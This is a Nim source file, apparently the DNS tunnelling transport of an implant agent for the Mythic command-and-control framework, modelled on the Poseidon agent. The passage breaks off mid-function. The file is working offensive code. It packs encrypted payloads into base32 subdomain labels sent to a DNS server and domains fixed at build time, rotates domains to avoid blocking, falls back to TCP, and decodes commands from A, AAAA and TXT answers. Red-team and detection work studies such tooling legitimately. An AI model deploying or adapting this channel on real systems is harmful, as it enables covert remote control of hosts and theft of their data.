import std/[strutils, json, random, os, sequtils, times, net, nativesockets, base64]
when not defined(windows):
  import posix
import ../config
import ../utils/crypto
import ../utils/debug
import ../utils/strenc

const encryptedExchange {.used.} = static: getEnv("ENCRYPTED_EXCHANGE_CHECK", "false").toLowerAscii in ["true", "t"]
when encryptedExchange:
  import std/base64
  import ../utils/rsa
  import ../utils/key_exchange

type
  DnsRecordType* = enum
    A = "A"
    AAAA = "AAAA"
    TXT = "TXT"

  DomainRotation* = enum
    RoundRobin = "round-robin"
    Random = "random"
    Sequential = "sequential"

  DnsAction* = enum
    AgentToServer = 0
    ServerToAgent = 1
    ReTransmit = 2
    MessageLost = 3

  DnsPacket* = object
    action: DnsAction
    agentSessionID: uint32
    messageID: uint32
    totalChunks: uint32
    currentChunk: uint32
    data: seq[byte]

  DnsProfile* = ref object
    config: Config
    aesKey: seq[byte]        # enc_key for encrypting
    aesDecKey: seq[byte]     # dec_key for decrypting
    dnsServer: string
    dnsPort: Port
    domains: seq[string]
    currentDomainIndex: int
    recordType: DnsRecordType
    domainRotation: DomainRotation
    maxQueryLength: int
    maxSubdomainLength: int
    failoverThreshold: int
    failureCount: int
    tcpClient: Socket  # TCP fallback connection like Poseidon
    useTcp: bool       # Flag to use TCP instead of UDP
    agentSessionID: uint32   # Random session ID, never changes
    nextMessageID: uint32    # Incremental message ID counter

proc newDnsProfile*(): DnsProfile =
  ## Create a new DNS profile
  result = DnsProfile()
  result.config = getConfig()
  result.useTcp = false
  
  # Generate random agent session ID (never changes for this agent instance)
  randomize()
  result.agentSessionID = uint32(rand(high(int32)))
  result.nextMessageID = 0  # Start message counter at 0
  
  debug "[DEBUG] DNS Profile: Initializing DNS profile..."
  
  # Parse DNS server and port from DNS_SERVER env var (format: "ip:port")
  let dnsServerStr = static: getEnv("DNS_SERVER")
  if dnsServerStr.len == 0:
    raise newException(ValueError, "DNS_SERVER environment variable is not set")
  let serverParts = dnsServerStr.split(":")
  if serverParts.len == 2:
    result.dnsServer = serverParts[0]
    try:
      result.dnsPort = Port(parseInt(serverParts[1]))
    except:
      raise newException(ValueError, "DNS_SERVER port is not a valid integer")
  else:
    raise newException(ValueError, "DNS_SERVER must be in format 'ip:port'")
  
  debug "[DEBUG] DNS Server: ", result.dnsServer, ":", $result.dnsPort
  
  # Parse domains from DOMAINS env var (JSON array)
  let domainsStr = static: getEnv("DOMAINS")
  if domainsStr.len == 0:
    raise newException(ValueError, "DOMAINS environment variable is not set")
  try:
    let domainsJson = parseJson(domainsStr)
    result.domains = @[]
    for domain in domainsJson:
      result.domains.add(domain.getStr())
    if result.domains.len == 0:
      raise newException(ValueError, "DOMAINS array is empty")
    debug "[DEBUG] Loaded ", result.domains.len, " domains"
  except ValueError as e:
    raise e
  except:
    raise newException(ValueError, "Failed to parse DOMAINS JSON array")
  
  result.currentDomainIndex = 0
  
  # Parse record type from RECORD_TYPE env var
  let recordTypeStr = static: getEnv("RECORD_TYPE")
  if recordTypeStr.len == 0:
    raise newException(ValueError, "RECORD_TYPE environment variable is not set")
  case recordTypeStr.toUpperAscii():
    of "A": result.recordType = DnsRecordType.A
    of "AAAA": result.recordType = DnsRecordType.AAAA
    of "TXT": result.recordType = DnsRecordType.TXT
    else:
      raise newException(ValueError, "RECORD_TYPE must be A, AAAA, or TXT")
  
  # Parse domain rotation strategy from DOMAIN_ROTATION env var
  let rotationStr = static: getEnv("DOMAIN_ROTATION")
  if rotationStr.len == 0:
    raise newException(ValueError, "DOMAIN_ROTATION environment variable is not set")
  case rotationStr.toLowerAscii():
    of "round-robin": result.domainRotation = DomainRotation.RoundRobin
    of "random": result.domainRotation = DomainRotation.Random
    of "sequential": result.domainRotation = DomainRotation.Sequential
    else:
      raise newException(ValueError, "DOMAIN_ROTATION must be round-robin, random, or sequential")
  
  # Parse max query length from MAX_QUERY_LENGTH env var
  let maxQueryStr = static: getEnv("MAX_QUERY_LENGTH")
  if maxQueryStr.len == 0:
    raise newException(ValueError, "MAX_QUERY_LENGTH environment variable is not set")
  try:
    result.maxQueryLength = parseInt(maxQueryStr)
  except:
    raise newException(ValueError, "MAX_QUERY_LENGTH is not a valid integer")
  
  # Parse max subdomain length from MAX_SUBDOMAIN_LENGTH env var
  let maxSubdomainStr = static: getEnv("MAX_SUBDOMAIN_LENGTH")
  if maxSubdomainStr.len == 0:
    raise newException(ValueError, "MAX_SUBDOMAIN_LENGTH environment variable is not set")
  try:
    result.maxSubdomainLength = parseInt(maxSubdomainStr)
    # DNS labels have a maximum length of 63 bytes (RFC 1035)
    if result.maxSubdomainLength > 63:
      result.maxSubdomainLength = 63
      debug "[DEBUG] Clamped MAX_SUBDOMAIN_LENGTH to 63 (DNS label limit)"
  except:
    raise newException(ValueError, "MAX_SUBDOMAIN_LENGTH is not a valid integer")
  
  # Parse failover threshold from FAILOVER_THRESHOLD env var
  let failoverStr = static: getEnv("FAILOVER_THRESHOLD")
  if failoverStr.len == 0:
    raise newException(ValueError, "FAILOVER_THRESHOLD environment variable is not set")
  try:
    result.failoverThreshold = parseInt(failoverStr)
  except:
    raise newException(ValueError, "FAILOVER_THRESHOLD is not a valid integer")
  
  result.failureCount = 0
  
  debug "[DEBUG] Record Type: ", $result.recordType
  debug "[DEBUG] Domain Rotation: ", $result.domainRotation
  debug "[DEBUG] Max Query Length: ", result.maxQueryLength
  debug "[DEBUG] Max Subdomain Length: ", result.maxSubdomainLength
  debug "[DEBUG] Failover Threshold: ", result.failoverThreshold
  debug "[DEBUG] DNS Profile: Initialization complete"

proc getNextDomain(profile: var DnsProfile): string =
  ## Get next domain based on rotation strategy
  case profile.domainRotation:
    of DomainRotation.RoundRobin:
      result = profile.domains[profile.currentDomainIndex]
      profile.currentDomainIndex = (profile.currentDomainIndex + 1) mod profile.domains.len
    of DomainRotation.Random:
      randomize()
      result = profile.domains[rand(profile.domains.len - 1)]
    of DomainRotation.Sequential:
      result = profile.domains[profile.currentDomainIndex]
      # Only rotate on failure threshold
      if profile.failureCount >= profile.failoverThreshold:
        profile.currentDomainIndex = (profile.currentDomainIndex + 1) mod profile.domains.len
        profile.failureCount = 0

proc encodeToDns(data: string): string =
  ## Encode data for DNS using base32 (DNS-safe alphabet)
  ## Using custom base32 with lowercase letters and digits (no padding)
  const base32Alphabet = "abcdefghijklmnopqrstuvwxyz234567"
  var encoded = ""
  var bits = 0
  var value = 0
  
  for c in data:
    value = (value shl 8) or ord(c)
    bits += 8
    
    while bits >= 5:
      bits -= 5
      encoded.add(base32Alphabet[(value shr bits) and 0x1F])
  
  if bits > 0:
    value = value shl (5 - bits)
    encoded.add(base32Alphabet[value and 0x1F])
  
  return encoded

proc decodeFromDns(encoded: string): string =
  ## Decode base32 DNS-encoded data
  const base32Alphabet = "abcdefghijklmnopqrstuvwxyz234567"
  var decoded = ""
  var bits = 0
  var value = 0
  
  for c in encoded:
    let idx = base32Alphabet.find(c)
    if idx < 0:
      continue  # Skip invalid characters
    
    value = (value shl 5) or idx
    bits += 5
    
    if bits >= 8:
      bits -= 8
      decoded.add(chr((value shr bits) and 0xFF))
  
  return decoded

proc encodeVarint(value: uint32): seq[byte] =
  ## Encode uint32 as protobuf varint
  result = @[]
  var val = value
  while val >= 0x80:
    result.add(byte((val and 0x7F) or 0x80))
    val = val shr 7
  result.add(byte(val and 0x7F))

proc decodeVarint(data: seq[byte], pos: var int): uint32 =
  ## Decode protobuf varint, updates pos
  result = 0
  var shift = 0
  while pos < data.len:
    let b = data[pos]
    inc pos
    result = result or ((uint32(b) and 0x7F) shl shift)
    if (b and 0x80) == 0:
      break
    shift += 7

proc marshalDnsPacket(packet: DnsPacket): seq[byte] =
  ## Marshal DnsPacket to protobuf format
  result = @[]
  
  # Field 1: Action (enum, encoded as varint)
  result.add(byte(0x08))  # field 1, wire type 0 (varint)
  result.add(encodeVarint(uint32(packet.action)))
  
  # Field 2: AgentSessionID (uint32)
  result.add(byte(0x10))  # field 2, wire type 0
  result.add(encodeVarint(packet.agentSessionID))
  
  # Field 3: MessageID (uint32)
  result.add(byte(0x18))  # field 3, wire type 0
  result.add(encodeVarint(packet.messageID))
  
  # Field 4: TotalChunks (uint32)
  result.add(byte(0x20))  # field 4, wire type 0
  result.add(encodeVarint(packet.totalChunks))
  
  # Field 5: CurrentChunk (uint32)
  result.add(byte(0x28))  # field 5, wire type 0
  result.add(encodeVarint(packet.currentChunk))
  
  # Field 6: Data (bytes)
  if packet.data.len > 0:
    result.add(byte(0x32))  # field 6, wire type 2 (length-delimited)
    result.add(encodeVarint(uint32(packet.data.len)))
    result.add(packet.data)

proc unmarshalDnsPacket(data: seq[byte]): DnsPacket =
  ## Unmarshal protobuf data to DnsPacket
  result = DnsPacket()
  var pos = 0
  
  while pos < data.len:
    let tag = data[pos]
    inc pos
    let fieldNum = tag shr 3
    let wireType = tag and 0x07
    
    case fieldNum:
      of 1:  # Action
        result.action = DnsAction(decodeVarint(data, pos))
      of 2:  # AgentSessionID
        result.agentSessionID = decodeVarint(data, pos)
      of 3:  # MessageID
        result.messageID = decodeVarint(data, pos)
      of 4:  # TotalChunks
        result.totalChunks = decodeVarint(data, pos)
      of 5:  # CurrentChunk
        result.currentChunk = decodeVarint(data, pos)
      of 6:  # Data (bytes)
        if wireType == 2:  # length-delimited
          let length = decodeVarint(data, pos)
          result.data = data[pos..<pos+int(length)]
          pos += int(length)
      else:
        # Skip unknown fields
        if wireType == 0:  # varint
          discard decodeVarint(data, pos)
        elif wireType == 2:  # length-delimited
          let length = decodeVarint(data, pos)
          pos += int(length)

proc chunkData(data: string, maxLen: int): seq[string] =
  ## Split data into chunks suitable for DNS subdomains
  result = @[]
  var i = 0
  while i < data.len:
    let chunkLen = min(maxLen, data.len - i)
    result.add(data[i..<i+chunkLen])
    i += chunkLen

proc removeTrailingBytes(data: seq[byte]): seq[byte] =
  ## Remove trailing padding bytes from A/AAAA record data
  ## The last byte indicates how many bytes to remove (PKCS-style padding)
  ## This matches Poseidon's removeTrailingBytes function
  if data.len == 0:
    return data
  result = data
  # Last byte tells us how many padding bytes to remove
  let totalToRemove = int(data[data.len - 1])
  if totalToRemove > 0 and totalToRemove <= data.len:
    result.setLen(data.len - totalToRemove)

proc getMaxDataLengthPerMessage(profile: DnsProfile, domain: string): int =
  ## Calculate maximum data length per message accounting for protobuf overhead and base32 expansion
  ## This matches Poseidon's calculation
  # Calculate protobuf packet overhead (empty DnsPacket marshaled size)
  let emptyPacket = DnsPacket(
    action: AgentToServer,
    agentSessionID: high(uint32),
    messageID: high(uint32),
    totalChunks: high(uint32),
    currentChunk: high(uint32),
    data: @[]
  )
  let emptyProto = marshalDnsPacket(emptyPacket)
  let fixedLengths = emptyProto.len  # Just protobuf overhead
  
  debug "[DEBUG] Fixed overhead: ", fixedLengths, " bytes (protobuf only)"
  debug "[DEBUG] Empty protobuf size: ", emptyProto.len, " bytes"
  debug "[DEBUG] Domain: '", domain, "' (", domain.len, " bytes)"
  
  # Iteratively find max data size that fits after base32 encoding
  # Base32 expands by ~60% (8 bytes become 13 chars)
  for i in 1..<profile.maxQueryLength:
    # Total protobuf size with this much data
    let totalSize = fixedLengths + i
    # After base32 encoding (60% expansion)
    let base32Len = int(float32(totalSize) * 1.6)
    # Calculate number of subdomains (ceiling division)
    let numSubdomains = (base32Len + profile.maxSubdomainLength - 1) div profile.maxSubdomainLength
    # Total length: base32 data + dots (one per subdomain) + domain length
    let totalQueryLen = base32Len + numSubdomains + domain.len
    
    # Check if total query exceeds max
    if totalQueryLen > profile.maxQueryLength:
      result = i - 1
      debug "[DEBUG] Max data per message: ", result, " bytes (base32=", base32Len, ", subdomains=", numSubdomains, ", total=", totalQueryLen, ")"
      return
  
  # Fallback if loop completes
  result = 1

proc skipDnsName(data: string, pos: var int): bool =
  ## Skip a DNS name (with compression support), returns true if successful
  ## Updates pos to point after the name
  if pos >= data.len:
    return false
  
  var maxJumps = 20  # Prevent infinite loops from malformed packets
  var jumped = false
  var origPos = pos
  
  while pos < data.len and maxJumps > 0:
    let labelLen = ord(data[pos])
    
    # Check for compression pointer (top 2 bits set: 0xC0)
    if (labelLen and 0xC0) == 0xC0:
      if pos + 1 >= data.len:
        return false
      
      # If we haven't jumped yet, advance original position past pointer
      if not jumped:
        pos += 2
        return true
      
      # Follow the pointer for continued parsing
      let offset = ((labelLen and 0x3F) shl 8) or ord(data[pos + 1])
      pos = offset
      jumped = true
      dec maxJumps
      continue
    
    # Regular label or end of name
    if labelLen == 0:
      inc pos  # Skip null terminator
      return true
    
    # Regular label - skip length byte + label data
    pos += labelLen + 1
    if pos > data.len:
      return false
  
  return false

proc dnsQuery(profile: var DnsProfile, encodedData: string): string =
  ## Perform DNS query with base32-encoded protobuf data
  ## The encodedData contains the full protobuf packet (already base32 encoded)
  ## Split it into subdomains and append domain
  
  let domain = profile.getNextDomain()
  
  # Build full query name by splitting encoded data into subdomain labels
  var queryName = ""
  var pos = 0
  while pos < encodedData.len:
    if queryName.len > 0:
      queryName.add(".")
    let chunkLen = min(profile.maxSubdomainLength, encodedData.len - pos)
    queryName.add(encodedData[pos..<pos+chunkLen])
    pos += chunkLen
    # Check if adding domain would exceed max query length
    if queryName.len + 1 + domain.len > profile.maxQueryLength:
      break
  
  queryName.add(".")
  queryName.add(domain)
  
  debug "[DEBUG] DNS Query: ", queryName
  
  # Build DNS query packet
  randomize()
  let txId = rand(0xFFFF)
  
  var packet = newSeq[byte]()
  # Transaction ID
  packet.add(byte((txId shr 8) and 0xFF))
  packet.add(byte(txId and 0xFF))
  # Flags: Standard query (0x0100)
  packet.add(0x01)
  packet.add(0x00)
  # Questions: 1
  packet.add(0x00)
  packet.add(0x01)
  # Answer RRs: 0
  packet.add(0x00)
  packet.add(0x00)
  # Authority RRs: 0
  packet.add(0x00)
  packet.add(0x00)
  # Additional RRs: 0
  packet.add(0x00)
  packet.add(0x00)
  
  # Question section - encode domain name as labels
  for label in queryName.split('.'):
    packet.add(byte(label.len))
    for c in label:
      packet.add(byte(c))
  packet.add(0x00)  # End of domain name
  
  # Query type
  case profile.recordType:
    of DnsRecordType.A:
      packet.add(0x00)
      packet.add(0x01)  # A record
    of DnsRecordType.AAAA:
      packet.add(0x00)
      packet.add(0x1C)  # AAAA record
    of DnsRecordType.TXT:
      packet.add(0x00)
      packet.add(0x10)  # TXT record
  
  # Query class: IN (Internet)
  packet.add(0x00)
  packet.add(0x01)
  
  var responseData: string
  
  try:
    # Try TCP first if we have an existing connection
    if profile.useTcp and not profile.tcpClient.isNil:
      debug "[DEBUG] Using existing TCP connection"
      try:
        # TCP DNS messages are prefixed with 2-byte length
        let msgLen = uint16(packet.len)
        var tcpPacket = newSeq[byte]()
        tcpPacket.add(byte((msgLen shr 8) and 0xFF))
        tcpPacket.add(byte(msgLen and 0xFF))
        tcpPacket.add(packet)
        
        profile.tcpClient.send(cast[string](tcpPacket))
        
        # Read 2-byte length prefix
        var lenBuf = newString(2)
        let lenRecv = profile.tcpClient.recv(lenBuf, 2)
        if lenRecv == 0:
          debug "[DEBUG] TCP connection closed by server (recv=0 on length)"
          profile.tcpClient.close()
          profile.tcpClient = nil
          profile.useTcp = false
          responseData = ""
        elif lenRecv < 2:
          debug "[DEBUG] TCP incomplete length read (", lenRecv, " bytes)"
          profile.tcpClient.close()
          profile.tcpClient = nil
          profile.useTcp = false
          responseData = ""
        else:
          let respLen = (uint16(ord(lenBuf[0])) shl 8) or uint16(ord(lenBuf[1]))
          debug "[DEBUG] TCP expects ", respLen, " bytes"
          
          if respLen == 0:
            debug "[DEBUG] TCP response length is 0, closing connection"
            profile.tcpClient.close()
            profile.tcpClient = nil
            profile.useTcp = false
            responseData = ""
          else:
            # Read response
            responseData = newString(respLen)
            let dataRecv = profile.tcpClient.recv(responseData, int(respLen))
            if dataRecv == 0:
              debug "[DEBUG] TCP connection closed by server (recv=0 on data)"
              profile.tcpClient.close()
              profile.tcpClient = nil
              profile.useTcp = false
              responseData = ""
            elif dataRecv < int(respLen):
              debug "[DEBUG] TCP incomplete data read (", dataRecv, "/", respLen, " bytes)"
              profile.tcpClient.close()
              profile.tcpClient = nil
              profile.useTcp = false
              responseData = ""
            elif responseData.len >= 12:
              debug "[DEBUG] TCP query successful (", dataRecv, " bytes)"
            else:
              debug "[DEBUG] TCP response too short, closing connection"
              profile.tcpClient.close()
              profile.tcpClient = nil
              profile.useTcp = false
              responseData = ""
      except:
        debug "[DEBUG] TCP connection failed: ", getCurrentExceptionMsg()
        try:
          profile.tcpClient.close()
        except:
          discard
        profile.tcpClient = nil
        profile.useTcp = false
        responseData = ""
    
    # Use UDP if no TCP connection or TCP failed
    if responseData.len == 0:
      debug "[DEBUG] Using UDP for DNS query"
      let sock = newSocket(Domain.AF_INET, SockType.SOCK_DGRAM, Protocol.IPPROTO_UDP)
      defer: sock.close()
      
      # Set timeout (5 seconds) - platform specific
      # Note: Socket timeout configuration is best-effort
      try:
        when defined(windows):
          # Windows uses milliseconds for timeout
          discard  # Timeout not critical, skip on Windows cross-compile
        else:
          # On POSIX systems, timeout is a timeval struct
          var timeout = Timeval(tv_sec: posix.Time(5), tv_usec: 0)
          if setsockopt(sock.getFd(), cint(SOL_SOCKET), cint(SO_RCVTIMEO), addr timeout, SockLen(sizeof(timeout))) < 0:
            debug "[DEBUG] Failed to set socket timeout"
      except:
        discard  # Timeout is not critical
      
      # Send DNS query
      sock.sendTo(profile.dnsServer, profile.dnsPort, cast[string](packet))
      
      # Receive response
      responseData = newString(512)
      var recvAddr: string
      var recvPort: Port
      let bytesReceived = sock.recvFrom(responseData, 512, recvAddr, recvPort)
      responseData.setLen(bytesReceived)
      
      debug "[DEBUG] UDP received ", bytesReceived, " bytes"
      
      if responseData.len < 12:
        debug "[DEBUG] DNS response too short (", responseData.len, " bytes)"
        return ""
      
      # Check for truncation flag (bit 9 of flags, byte 2 bit 1)
      let flags = (uint16(ord(responseData[2])) shl 8) or uint16(ord(responseData[3]))
      let truncated = (flags and 0x0200) != 0
      
      debug "[DEBUG] DNS flags: 0x", flags.toHex(4), ", truncated: ", truncated
      
      if truncated:
        debug "[DEBUG] Response truncated, switching to TCP"
        try:
          # Open TCP connection
          profile.tcpClient = newSocket(Domain.AF_INET, SockType.SOCK_STREAM, Protocol.IPPROTO_TCP)
          profile.tcpClient.connect(profile.dnsServer, profile.dnsPort)
          profile.useTcp = true
          
          # TCP DNS messages are prefixed with 2-byte length
          let msgLen = uint16(packet.len)
          var tcpPacket = newSeq[byte]()
          tcpPacket.add(byte((msgLen shr 8) and 0xFF))
          tcpPacket.add(byte(msgLen and 0xFF))
          tcpPacket.add(packet)
          
          profile.tcpClient.send(cast[string](tcpPacket))
          
          # Read 2-byte length prefix
          var lenBuf = newString(2)
          discard profile.tcpClient.recv(lenBuf, 2)
          let respLen = (uint16(ord(lenBuf[0])) shl 8) or uint16(ord(lenBuf[1]))
          
          # Read response
          responseData = newString(respLen)
          discard profile.tcpClient.recv(responseData, int(respLen))
          
          debug "[DEBUG] TCP fallback successful"
        except:
          debug "[DEBUG] TCP fallback failed: ", getCurrentExceptionMsg()
          try:
            if not profile.tcpClient.isNil:
              profile.tcpClient.close()
          except:
            discard
          profile.tcpClient = nil
          profile.useTcp = false
          # Use truncated UDP response as fallback
    
    if responseData.len < 12:
      debug "[DEBUG] DNS response too short after all attempts"
      return ""
    
    if responseData.len < 12:
      debug "[DEBUG] DNS response too short after all attempts"
      return ""
    
    # Parse DNS response to extract data
    # For TXT records, extract the text data
    # For A/AAAA records, extract the IP address and decode it
    
    # TXT records can have MULTIPLE answers (like A/AAAA), each with MULTIPLE strings
    # For large data, Mythic sends multiple TXT answers
    # Each TXT answer contains one or more length-prefixed strings
    # We concatenate strings from ALL answers, then base64 decode
    if profile.recordType == DnsRecordType.TXT:
      # Check answer count first (bytes 6-7 of DNS header)
      let answerCount = (uint16(ord(responseData[6])) shl 8) or uint16(ord(responseData[7]))
      
      debug "[DEBUG] TXT answer count: ", answerCount
      
      if answerCount == 0:
        return ""
      
      # Skip to answer section (after question)
      var pos = 12  # Skip header
      # Skip question section using compression-aware parser
      if not skipDnsName(responseData, pos):
        return ""
      pos += 4  # Skip type and class
      
      # Parse ALL TXT answers and concatenate their strings
      var allStrings = ""
      for i in 0..<int(answerCount):
        if pos + 10 < responseData.len:
          # Skip answer name (might be compressed)
          if not skipDnsName(responseData, pos):
            break
          
          # Read type and class
          if pos + 4 > responseData.len:
            break
          pos += 4
          
          # Skip TTL
          if pos + 4 > responseData.len:
            break
          pos += 4
          
          # Read data length (total TXT record data length)
          if pos + 2 > responseData.len:
            break
          let dataLen = (ord(responseData[pos]) shl 8) or ord(responseData[pos + 1])
          pos += 2
          
          # TXT record contains one or more length-prefixed strings
          let endPos = pos + dataLen
          
          while pos < endPos and pos < responseData.len:
            # Each string: [length_byte][string_data]
            let txtLen = ord(responseData[pos])
            inc pos
            
            if pos + txtLen <= responseData.len:
              allStrings.add(responseData[pos..<pos+txtLen])
              pos += txtLen
            else:
              break
      
      debug "[DEBUG] TXT extracted ", allStrings.len, " bytes from ", answerCount, " answers"
      result = allStrings
    
    elif profile.recordType == DnsRecordType.AAAA:
      # Extract IPv6 address bytes - server sends MULTIPLE AAAA records
      # Each IPv6: [order_index, data[15 bytes]]
      # Byte 0 = order, bytes 1-15 = data chunk (15 bytes per record)
      
      # Extract answer count from DNS header (bytes 6-7)
      let answerCount = (uint16(ord(responseData[6])) shl 8) or uint16(ord(responseData[7]))
      debug "[DEBUG] Answer count: ", answerCount
      
      var pos = 12
      # Skip question using compression-aware parser
      if not skipDnsName(responseData, pos):
        return ""
      pos += 4  # type and class
      
      # Pre-allocate array for ordered chunks
      var orderedChunks = newSeq[string](int(answerCount))
      var actionCode: uint8 = 0
      
      # Parse ALL answer records
      for i in 0..<int(answerCount):
        if pos + 10 < responseData.len:
          # Skip answer name
          if not skipDnsName(responseData, pos):
            return ""
          pos += 4  # type/class
          pos += 4  # TTL
          if pos + 2 > responseData.len:
            return ""
          let dataLen = (ord(responseData[pos]) shl 8) or ord(responseData[pos + 1])
          pos += 2
          
          if dataLen == 16 and pos + 16 <= responseData.len:
            # Extract: [order_index, data[15 bytes]]
            let orderIdx = ord(responseData[pos])
            if orderIdx < int(answerCount):
              # Bytes 1-15 are the data (15 bytes per AAAA record)
              orderedChunks[orderIdx] = responseData[pos+1..<pos+16]
              # First chunk's last byte is action code
              if orderIdx == 0:
                actionCode = uint8(ord(responseData[pos+15]))
            pos += 16
      
      # Assemble all chunks in order (skip first chunk if it's action-only)
      debug "[DEBUG] Action code from first chunk: ", actionCode
      debug "[DEBUG] Ordered chunks count: ", orderedChunks.len
      
      # If only 1 answer (action-only response), return 16 bytes with action code
      if orderedChunks.len == 1:
        debug "[DEBUG] Single AAAA record - returning action code only"
        # Return 16-byte response with action code in last byte
        result = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" & chr(actionCode)
      else:
        # Multiple AAAA records - assemble data chunks (skip first which is action code)
        for i in 1..<orderedChunks.len:
          result.add(orderedChunks[i])
          debug "[DEBUG] Added chunk ", i, " (", orderedChunks[i].len, " bytes)"
    
    elif profile.recordType == DnsRecordType.A:
      # Extract IPv4 address bytes - server sends MULTIPLE A records
      # Each IP: [order_index, data1, data2, data3]
      # Byte 0 = order, bytes 1-3 = data chunk
      
      # Extract answer count from DNS header (bytes 6-7)
      let answerCount = (uint16(ord(responseData[6])) shl 8) or uint16(ord(responseData[7]))
      debug "[DEBUG] Answer count: ", answerCount
      
      var pos = 12
      # Skip question using compression-aware parser
      if not skipDnsName(responseData, pos):
        return ""
      pos += 4  # type and class
      
      # Pre-allocate array for ordered chunks
      var orderedChunks = newSeq[string](int(answerCount))
      var actionCode: uint8 = 0
      
      # Parse ALL answer records
      for i in 0..<int(answerCount):
        if pos + 10 < responseData.len:
          # Skip answer name
          if not skipDnsName(responseData, pos):
            return ""
          pos += 4  # type/class
          pos += 4  # TTL
          if pos + 2 > responseData.len:
            return ""
          let dataLen = (ord(responseData[pos]) shl 8) or ord(responseData[pos + 1])
          pos += 2
          
          if dataLen == 4 and pos + 4 <= responseData.len:
            # Extract: [order_index, data1, data2, data3]
            let orderIdx = ord(responseData[pos])
            if orderIdx < int(answerCount):
              # Bytes 1-3 are the data
              orderedChunks[orderIdx] = responseData[pos+1..<pos+4]
              # First chunk's last byte is action code
              if orderIdx == 0:
                actionCode = uint8(ord(responseData[pos+3]))
            pos += 4
      
      # Assemble all chunks in order (skip first chunk, it's just action code)
      debug "[DEBUG] Action code from first chunk: ", actionCode
      debug "[DEBUG] Ordered chunks count: ", orderedChunks.len
      
      # If only 1 answer (action-only response), return the raw 4 bytes for action code checking
      if orderedChunks.len == 1:
        debug "[DEBUG] Single A record - returning action code only"
        # Return a 4-byte response with action code in last byte (like old code)
        result = "\x00\x00\x00" & chr(actionCode)
      else:
        # Multiple A records - assemble data chunks (skip first which is action code)
        for i in 1..<orderedChunks.len:
          result.add(orderedChunks[i])
          debug "[DEBUG] Added chunk ", i, " (", orderedChunks[i].len, " bytes)"
    
    profile.failureCount = 0  # Reset on success
    debug "[DEBUG] DNS response data: ", result[0..<min(100, result.len)]
    
  except:
    debug "[DEBUG] DNS query failed: ", getCurrentExceptionMsg()
    profile.failureCount += 1
    # Close TCP connection on failure
    try:
      if not profile.tcpClient.isNil:
        profile.tcpClient.close()
        profile.tcpClient = nil
        profile.useTcp = false
    except:
      discard
    result = ""

proc send*(profile: var DnsProfile, data: string, callbackUuid: string = ""): string =
  ## Send data via DNS queries using protobuf
  let uuid = if callbackUuid.len > 0: callbackUuid else: profile.config.uuid
  
  debug "[DEBUG] === SENDING DATA VIA DNS ==="
  debug "[DEBUG] Data length: ", data.len, " bytes"
  
  # Encrypt if AES key is available and we have callback UUID
  var payload: string
  if profile.aesKey.len > 0 and callbackUuid.len > 0:
    debug "[DEBUG] Encrypting payload with AES-256-CBC+HMAC"
    # Encrypt data WITHOUT UUID (UUID should not be part of HMAC calculation)
    let dataBytes = cast[seq[byte]](data)
    let encrypted = encryptAES256(dataBytes, profile.aesKey)
    # Prepend UUID AFTER encryption (like Poseidon) - UUID is in plaintext
    payload = uuid & cast[string](encrypted)
    debug "[DEBUG] Encrypted payload length: ", payload.len, " bytes"
  else:
    debug "[DEBUG] Sending unencrypted payload"
    payload = uuid & data
    debug "[DEBUG] Payload length: ", payload.len, " bytes"
  
  # Calculate chunk size based on DNS constraints, protobuf overhead, and base32 expansion
  # This matches Poseidon's calculation
  let domain = profile.getNextDomain()
  let maxChunkSize = profile.getMaxDataLengthPerMessage(domain)
  
  debug "[DEBUG] Using max chunk size: ", maxChunkSize, " bytes"
  
  let chunks = chunkData(payload, maxChunkSize)
  
  debug "[DEBUG] Split into ", chunks.len, " chunks"
  
  # Retry loop for handling retransmit requests
  var maxRetries = 3
  var retryCount = 0
  
  # Save messageID for this message - use same ID across all retries
  let currentMessageID = profile.nextMessageID
  let responseMessageID = currentMessageID + 1
  
  while retryCount < maxRetries:
    if retryCount > 0:
      debug "[DEBUG] Retransmit attempt ", retryCount, "/", maxRetries
    
    # Send each chunk as protobuf packet
    var lastResponse: string = ""
    var needRetransmit = false
    for idx, chunk in chunks:
      var packet = DnsPacket(
        action: AgentToServer,
        agentSessionID: profile.agentSessionID,
        messageID: currentMessageID,  # Use saved messageID for retries
        totalChunks: uint32(chunks.len),
        currentChunk: uint32(idx),
        data: cast[seq[byte]](chunk)
      )
      
      # Marshal to protobuf binary
      let protoData = marshalDnsPacket(packet)
      
      # Encode as base32 for DNS
      let encoded = encodeToDns(cast[string](protoData))
      
      debug "[DEBUG] Sending chunk ", idx + 1, "/", chunks.len, " (data=", chunk.len, " bytes, protobuf=", protoData.len, " bytes, base32=", encoded.len, " chars)"
      let chunkResp = profile.dnsQuery(encoded)
      if chunkResp.len > 0:
        let respBytes = cast[seq[byte]](chunkResp)
        debug "[DEBUG] Chunk ", idx + 1, " response: ", respBytes.mapIt(it.toHex(2)).join(" ")
        # Check for ReTransmit on individual chunk (action code 2)
        # For TXT records, response is ASCII character, so '2' (0x32) not binary 2
        if ((profile.recordType == DnsRecordType.A and respBytes.len == 4 and respBytes[3] == 2) or
            (profile.recordType == DnsRecordType.AAAA and respBytes.len == 16 and respBytes[15] == 2) or
            (profile.recordType == DnsRecordType.TXT and respBytes.len == 1 and respBytes[0] == ord('2'))):
          debug "[DEBUG] Server requested retransmit on chunk ", idx + 1
          needRetransmit = true
          break  # Stop sending more chunks, we'll retry all from the beginning
        # Save last chunk response - server may include reply data here
        lastResponse = chunkResp
      else:
        debug "[DEBUG] No response for chunk ", idx + 1
        needRetransmit = true
        break
    
    # If any chunk triggered retransmit, restart the loop
    if needRetransmit:
      debug "[DEBUG] Retransmitting all chunks"
      inc retryCount
      continue
    
    # Use the last chunk's response - check action code
    let response = lastResponse
    
    if response.len == 0:
      debug "[DEBUG] No response received"
      return ""
    
    # Response is raw bytes from DNS record (IP address bytes or TXT string)
    var responseBytes = cast[seq[byte]](response)
    
    debug "[DEBUG] Response bytes length: ", responseBytes.len
    debug "[DEBUG] Response hex: ", responseBytes.mapIt(it.toHex(2)).join(" ")
    
    # For A records (4 bytes), AAAA records (16 bytes), or TXT records (single character string), check the action code
    if (profile.recordType == DnsRecordType.A and responseBytes.len == 4) or 
       (profile.recordType == DnsRecordType.AAAA and responseBytes.len == 16) or
       (profile.recordType == DnsRecordType.TXT and responseBytes.len <= 3):  # "0", "1", "2", or "3" - single char action code
      # For TXT records, convert ASCII character to numeric value ('0'->0, '1'->1, etc)
      let action = if profile.recordType == DnsRecordType.TXT:
        # TXT response is ASCII string "0", "1", "2", "3"
        uint8(responseBytes[0] - ord('0'))
      else:
